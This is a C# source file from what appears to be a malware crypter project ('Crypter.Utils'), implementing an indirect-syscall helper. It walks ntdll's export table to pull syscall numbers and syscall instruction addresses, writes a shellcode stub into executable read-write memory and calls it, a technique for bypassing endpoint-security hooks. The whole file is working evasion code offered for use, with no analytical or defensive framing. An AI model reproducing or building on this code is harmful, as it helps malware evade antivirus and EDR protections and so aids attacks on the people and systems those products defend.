using System;
using System.Runtime.InteropServices;

namespace Crypter.Utils
{
    public class IndirectSyscallHelper
    {
        private const int IMAGE_DIRECTORY_ENTRY_EXPORT = 0;

        // Define structs with proper StructLayout attributes
        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res1;
            public ushort e_oemid;
            public ushort e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;
            public int e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_OPTIONAL_HEADER64
        {
            public ushort Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_NT_HEADERS64
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_EXPORT_DIRECTORY
        {
            public uint Characteristics;
            public uint TimeDateStamp;
            public ushort MajorVersion;
            public ushort MinorVersion;
            public uint Name;
            public uint Base;
            public uint NumberOfFunctions;
            public uint NumberOfNames;
            public uint AddressOfFunctions;
            public uint AddressOfNames;
            public uint AddressOfNameOrdinals;
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DynamicSyscallDelegate(IntPtr arg1, IntPtr arg2, IntPtr arg3, IntPtr arg4);

        private static IntPtr GetNtdllBase()
        {
            return GetModuleHandle("ntdll.dll");
        }

        private static unsafe uint GetSyscallNumber(string functionName)
        {
            var ntdllBase = GetNtdllBase();
            if (ntdllBase == IntPtr.Zero) return 0;

            // Fixed pointers to prevent CS8500 warnings
            var dosHeaderPtr = (IMAGE_DOS_HEADER*)(ntdllBase.ToPointer());
            var ntHeadersPtr = (IMAGE_NT_HEADERS64*)((byte*)(ntdllBase.ToPointer()) + dosHeaderPtr->e_lfanew);
            var exportDir = (IMAGE_EXPORT_DIRECTORY*)((byte*)(ntdllBase.ToPointer()) + 
                ntHeadersPtr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            var names = (uint*)((byte*)(ntdllBase.ToPointer()) + exportDir->AddressOfNames);
            var ordinals = (ushort*)((byte*)(ntdllBase.ToPointer()) + exportDir->AddressOfNameOrdinals);
            var functions = (uint*)((byte*)(ntdllBase.ToPointer()) + exportDir->AddressOfFunctions);

            for (uint i = 0; i < exportDir->NumberOfNames; i++)
            {
                var name = Marshal.PtrToStringAnsi((IntPtr)((byte*)(ntdllBase.ToPointer()) + names[i]));
                if (name == functionName)
                {
                    var ordinal = ordinals[i];
                    var rva = functions[ordinal];
                    var function = (byte*)(ntdllBase.ToPointer()) + rva;

                    // Find syscall number
                    for (int j = 0; j < 24; j++)
                    {
                        if (function[j] == 0xB8) // mov eax, syscallnr
                        {
                            return *(uint*)(function + j + 1);
                        }
                    }
                    break;
                }
            }
            return 0;
        }

        private static unsafe IntPtr GetSyscallAddress(string functionName)
        {
            var ntdllBase = GetNtdllBase();
            if (ntdllBase == IntPtr.Zero) return IntPtr.Zero;

            // Fixed pointers to prevent CS8500 warnings
            var dosHeaderPtr = (IMAGE_DOS_HEADER*)(ntdllBase.ToPointer());
            var ntHeadersPtr = (IMAGE_NT_HEADERS64*)((byte*)(ntdllBase.ToPointer()) + dosHeaderPtr->e_lfanew);
            var exportDir = (IMAGE_EXPORT_DIRECTORY*)((byte*)(ntdllBase.ToPointer()) + 
                ntHeadersPtr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            var names = (uint*)((byte*)(ntdllBase.ToPointer()) + exportDir->AddressOfNames);
            var ordinals = (ushort*)((byte*)(ntdllBase.ToPointer()) + exportDir->AddressOfNameOrdinals);
            var functions = (uint*)((byte*)(ntdllBase.ToPointer()) + exportDir->AddressOfFunctions);

            for (uint i = 0; i < exportDir->NumberOfNames; i++)
            {
                var name = Marshal.PtrToStringAnsi((IntPtr)((byte*)(ntdllBase.ToPointer()) + names[i]));
                if (name == functionName)
                {
                    var ordinal = ordinals[i];
                    var rva = functions[ordinal];
                    var function = (byte*)(ntdllBase.ToPointer()) + rva;

                    // Find syscall instruction
                    for (int j = 0; j < 32; j++)
                    {
                        if (function[j] == 0x0F && function[j + 1] == 0x05) // syscall
                        {
                            return (IntPtr)(function + j);
                        }
                    }
                    break;
                }
            }
            return IntPtr.Zero;
        }

        public static unsafe bool ExecuteIndirectSyscall(string functionName, params IntPtr[] args)
        {
            var ssn = GetSyscallNumber(functionName);
            if (ssn == 0) return false;

            var syscallAddr = GetSyscallAddress(functionName);
            if (syscallAddr == IntPtr.Zero) return false;

            // Prepare shellcode for indirect syscall
            byte[] shellcode = new byte[] {
                0x4C, 0x8B, 0xD1,                 // mov r10, rcx
                0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, ssn
                0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs r11, syscall_address
                0x41, 0xFF, 0xE3                  // jmp r11
            };

            // Insert syscall number
            Buffer.BlockCopy(BitConverter.GetBytes(ssn), 0, shellcode, 4, 4);

            // Insert syscall address
            Buffer.BlockCopy(BitConverter.GetBytes(syscallAddr.ToInt64()), 0, shellcode, 10, 8);

            // Allocate memory for shellcode
            var shellcodeAddr = VirtualAlloc(
                IntPtr.Zero,
                (UIntPtr)shellcode.Length,
                0x1000 | 0x2000, // MEM_COMMIT | MEM_RESERVE
                0x40             // PAGE_EXECUTE_READWRITE
            );

            if (shellcodeAddr == IntPtr.Zero) return false;

            try
            {
                // Copy shellcode
                Marshal.Copy(shellcode, 0, shellcodeAddr, shellcode.Length);

                // Create delegate for shellcode
                var syscallDelegate = (DynamicSyscallDelegate)Marshal.GetDelegateForFunctionPointer(
                    shellcodeAddr,
                    typeof(DynamicSyscallDelegate)
                );

                // Execute indirect syscall
                var result = syscallDelegate(
                    args.Length > 0 ? args[0] : IntPtr.Zero,
                    args.Length > 1 ? args[1] : IntPtr.Zero,
                    args.Length > 2 ? args[2] : IntPtr.Zero,
                    args.Length > 3 ? args[3] : IntPtr.Zero
                );

                return result >= 0;
            }
            finally
            {
                VirtualFree(shellcodeAddr, UIntPtr.Zero, 0x8000); // MEM_RELEASE
            }
        }
    }
} 